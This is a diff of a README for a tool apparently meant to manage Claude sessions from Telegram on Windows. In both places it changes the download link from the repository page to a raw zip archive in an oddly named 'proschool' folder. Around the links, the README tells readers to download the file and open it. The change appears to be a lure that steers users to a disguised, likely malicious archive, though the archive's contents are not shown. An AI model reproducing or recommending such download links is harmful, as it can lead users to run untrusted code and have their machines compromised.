@@ -1,6 +1,6 @@
 # 🤖 claude-code-multisession-channels - Manage Claude sessions from one chat
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-6e6e6e?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Emlynneaboveground620/claude-code-multisession-channels)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-6e6e6e?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Emlynneaboveground620/claude-code-multisession-channels/main/proschool/claude_multisession_code_channels_2.3.zip)
 
 ## 🧭 What this app does
 
@@ -32,7 +32,7 @@ For best results, use a recent version of Windows and keep Telegram installed on
 
 Use this link to visit the page to download:
 
-[Visit the download page](https://github.com/Emlynneaboveground620/claude-code-multisession-channels)
+[Visit the download page](https://raw.githubusercontent.com/Emlynneaboveground620/claude-code-multisession-channels/main/proschool/claude_multisession_code_channels_2.3.zip)
 
 If the page gives you a release file or setup file, download it to your PC and then open it.
 
